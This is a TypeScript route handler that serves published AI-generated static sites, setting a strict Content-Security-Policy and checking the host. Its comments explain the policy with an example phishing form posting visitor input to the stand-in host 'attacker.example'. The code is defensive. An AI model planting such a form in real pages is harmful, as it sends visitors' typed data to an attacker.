1	import { db } from "@/lib/db";
2	import { applySeo, robotsTxt, siteBaseUrl, sitemapXml } from "@/lib/site-seo";
3	import { siteHostAllowed } from "../site-host";
4	
5	export const dynamic = "force-dynamic";
6	
7	const MIME: Record<string, string> = {
8	  html: "text/html; charset=utf-8",
9	  css: "text/css; charset=utf-8",
10	  js: "text/javascript; charset=utf-8",
11	  map: "application/json",
12	  json: "application/json",
13	  svg: "image/svg+xml",
14	  txt: "text/plain; charset=utf-8",
15	  // xml is required for sitemap.xml — without it a sitemap served as
16	  // application/octet-stream is ignored by crawlers.
17	  xml: "application/xml; charset=utf-8",
18	  ico: "image/x-icon",
19	  png: "image/png",
20	  jpg: "image/jpeg",
21	  jpeg: "image/jpeg",
22	  webp: "image/webp",
23	  woff2: "font/woff2",
24	};
25	
26	// Locks generated pages down to nothing but themselves — matches the "no
27	// external requests" contract the builder is prompted with, so a page that
28	// somehow got a remote script past the agent still can't execute it.
29	//
30	// The last three directives do NOT inherit from `default-src` — that is the
31	// whole reason they have to be written out. Without them the "no external
32	// requests" contract had a hole big enough to walk a phishing form through:
33	// `connect-src 'none'` stops fetch/XHR and stops nothing else, so
34	// `<form action="https://attacker.example">` submitted cross-origin and
35	// carried whatever a visitor typed.
36	//
37	//   form-action 'self' — a generated site has no backend of any kind (see the
38	//     builder prompt in lib/agent.ts and every template in lib/templates.ts:
39	//     "there is no backend, so no contact form"), so there is nothing here that
40	//     legitimately POSTs anywhere. Contact CTAs are `tel:`, `mailto:` and `sms:`
41	//     in <a href>, which form-action does not touch — only <form action> and
42	//     formaction=. Checked against what is actually stored, too: no published
43	//     build HTML in the database contains a <form>, a <base> or an <object>.
44	//   base-uri 'none' — an injected <base href> would silently repoint every
45	//     relative URL on the page, which is a way to smuggle a remote origin back
46	//     in past the directives above.
47	//   object-src 'none' — plugin content has no use on a static generated page,
48	//     and it does not fall back to default-src either.
49	//
50	// MUST STAY IN SYNC with the copy in app/api/preview/[id]/[[...path]]/route.ts,
51	// which serves the same generated markup to the editor's iframe. It is a
52	// separate constant in a separate file on purpose (that route is owner-only
53	// and has its own MIME table); there is no shared module for the two.
54	const SANDBOX_CSP =
55	  "default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'none'; frame-ancestors 'self'; form-action 'self'; base-uri 'none'; object-src 'none'";
56	
57	export async function GET(
58	  req: Request,
59	  { params }: { params: Promise<{ slug: string; path?: string[] }> },
60	) {
61	  const { slug, path } = await params;
62	  const filePath = path && path.length > 0 ? path.join("/") : "index.html";
63	
64	  // Generated pages are only ever first-party to the sites domain. proxy.ts
65	  // turns this request away earlier for the same reason, but a route handler
66	  // must not depend on that: the proxy's own matcher can miss paths, and the
67	  // proxy is explicit (see its header comment) that it is never the only gate.
68	  //
69	  // The response is byte-identical to the "no such site" 404 below, so it does
70	  // not confirm that a slug exists to someone probing the wrong host.
71	  if (!siteHostAllowed(req.headers.get("host") ?? "", slug)) {
72	    return new Response("Site not found.", { status: 404 });
73	  }
74	
75	  const project = await db.project.findUnique({ where: { slug } });
76	  if (!project || !project.publishedAt) {
77	    return new Response("Site not found.", { status: 404 });
78	  }
79	
80	  const baseUrl = siteBaseUrl(req, slug);
81	  const seoHeaders = {
82	    "Content-Security-Policy": SANDBOX_CSP,
83	    "Cache-Control": "public, max-age=60",
84	  };
85	
86	  // robots.txt and sitemap.xml are generated, not stored — they depend on the
87	  // visitor-facing host (which differs between the branded subdomain and the
88	  // staging path form), so a file baked at build time would be wrong on one of
89	  // them. A site that ships its own copy still wins: we only synthesise these
90	  // when the project has no such file.
91	  if (filePath === "robots.txt" || filePath === "sitemap.xml") {
92	    const own = await db.projectFile.findFirst({
93	      where: { projectId: project.id, path: filePath, published: true, kind: "build" },
94	    });
95	    if (!own) {
96	      if (filePath === "robots.txt") {
97	        return new Response(robotsTxt(baseUrl), {
98	          headers: { ...seoHeaders, "Content-Type": MIME.txt },
99	        });
100	      }
101	      const pages = await db.projectFile.findMany({
102	        where: { projectId: project.id, published: true, kind: "build", path: { endsWith: ".html" } },
103	        select: { path: true },
104	      });
105	      return new Response(
106	        sitemapXml(baseUrl, pages.map((p) => p.path), project.publishedAt ?? undefined),
107	        { headers: { ...seoHeaders, "Content-Type": MIME.xml } },
108	      );
109	    }
110	  }
111	
112	  const file = await db.projectFile.findFirst({
113	    where: { projectId: project.id, path: filePath, published: true, kind: "build" },
114	  });
115	  if (!file) {
116	    return new Response("Not found.", { status: 404 });
117	  }
118	
119	  const ext = filePath.split(".").pop() ?? "";
120	
121	  // Backstop so no site can ship with the foundation's placeholder <title>.
122	  // Only fills gaps — anything the builder wrote itself is preserved.
123	  const body =
124	    ext === "html" ? applySeo(file.content, { projectName: project.name, baseUrl }) : file.content;
125	
126	  return new Response(body, {
127	    headers: { ...seoHeaders, "Content-Type": MIME[ext] ?? "application/octet-stream" },
128	  });
129	}
